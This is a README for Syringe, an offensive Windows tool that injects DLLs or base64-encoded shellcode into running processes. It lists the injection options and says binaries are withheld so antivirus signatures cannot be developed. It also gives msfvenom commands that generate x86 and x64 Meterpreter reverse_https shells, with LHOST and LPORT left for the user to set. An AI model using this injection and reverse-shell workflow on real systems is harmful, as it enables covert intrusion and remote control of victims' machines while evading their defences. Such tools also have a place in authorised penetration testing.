# Syringe

Syringe is a general purpose DLL and code injection utility for 32 and 64-bit
Windows. It is capable of executing raw shellcode as well as injecting
shellcode or a DLL directly into running processes.

## Compilation

Syringe is distributed in source code form only.  Compiled binary files are not available.  This was a conscious decision in order to prevent AV signatures from being developed.  As such, users will have to compile Syringe locally.  Syringe is meant to be compiled in Visual Studio 2013, other versions of VS, and other IDEs are not supported.  Syringe can be compiled by loading the provided project file (syringe.sln) with VS, specifying the desired architecture, and building.

## Usage

Syringe supports three options for injection (specified with "-1", "-2", or "-3").  The following examples assume the x86 version.

* DLL injection.
  * Using the "-1" option, Syringe can inject an arbitrary DLL into a process specified by a process ID.
  * Usage: `syringe.x86.exe -1 <DLL file> <PID>`
* Shellcode Injection
  * Using the "-2" option, Syringe can inject specifically formatted shellcode into a specified process.
  * Usage: `syringe.x86.exe -2 <shellcode> <PID>`
* Shellcode Injection Alternative
  * Using the "-3" option, Syringe can inject specifically formatted shellcode into itself (no PID necessary).
  * Usage: `syringe.x86.exe -3 <shellcode>`

For information on how to format shellcode for use with Syringe, see the following section.

## Formatting Shellcode

Syringe requires shellcode to be supplied in a base64 encoded format.  The following commands can be used on most \*nix systems (with [Metasploit](https://github.com/rapid7/metasploit-framework) installed) to generate the shellcode appropriately.  **Be sure to change the "LHOST", "LPORT" and "-p" options accordingly.**

* x86 shellcode
  * `sudo msfvenom -p windows/meterpreter/reverse_https -t raw LHOST=127.0.0.1 LPORT=443 ExitFunc=thread | base64 | awk 1 ORS=''`
* x64 shellcode
  * `sudo msfvenom -p windows/x64/meterpreter/reverse_https -t raw LHOST=127.0.0.1 LPORT=443 ExitFunc=thread | base64 | awk 1 ORS=''`

### License
Syringe is released under the GPL v3 license, for more details see
the [LICENSE](https://github.com/securestate/syringe/blob/master/LICENSE) file.
